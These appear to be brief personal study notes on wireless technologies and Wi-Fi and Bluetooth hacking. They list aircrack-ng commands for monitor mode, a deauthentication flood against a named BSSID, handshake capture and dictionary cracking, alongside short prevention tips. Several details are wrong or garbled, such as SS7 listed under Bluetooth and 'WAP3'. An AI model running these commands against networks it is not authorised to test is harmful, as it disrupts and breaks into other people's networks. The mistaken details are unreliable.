- A wireless network is a set of two or more devices connected with each other via radio waves within a limited space range.
#### Type of wireless technology
- wifi -- radio wave  2.4GHz
- Bluetooth -- 2.4GHz  100 meter
- Zipbee --- low power consumption  2.4 GHz   915MHz(USA) , 868MHz(Europe)
- nfc --- 4cm 13.56mHz
- Cellular Network  --- 2G , 3G, 4G, 5G  ,  large distance
- LoRa
- Infrared
#### Wireless Hacking
- Wi-Fi (wireless Fidelity)
	- monitor mode
	- managed mode
	- SSID, BSSID,WLAN, CHANNEL(13channel  2.4GHz, 45 channel 5GHz)
	- wireless encryption protocols (WEP, WAP, WPA2, WPA3 )
	##### WLAN Recon
	- iwconfig
	- airmon-ng start <interface>
	- sudo airmon-ng stop <interface>
	- sudo kill 123
	
	- sudo airodump-ng <interface>
		
	#### Hacking WLAN
		1- WPS (to prevent disable WPS)
		2- Handshake Bruteforce (to prevent use WAP3, strong passphrase)
			- airodump-ng wlan0
			
			- airodump-ng --channel 4 -w geez
			
			-sudo aireplay-ng -0 100-a 44:c8:74:86:A2:48 wlan0

			- aircrack-ng geez-01.cap -w rockyou.txt
			
		3- WEP Attack (to prevent donot use)
		4- Evil-twin attack (to prevent use VPN, autosave, https)
			- airgedddon
			-
	#### Bluetooth Hacking
		Bluetooth attack
		- BlueSnarfing
		- BlueScanner
		- BlueBugger
		- SS7
	#### Mobile Security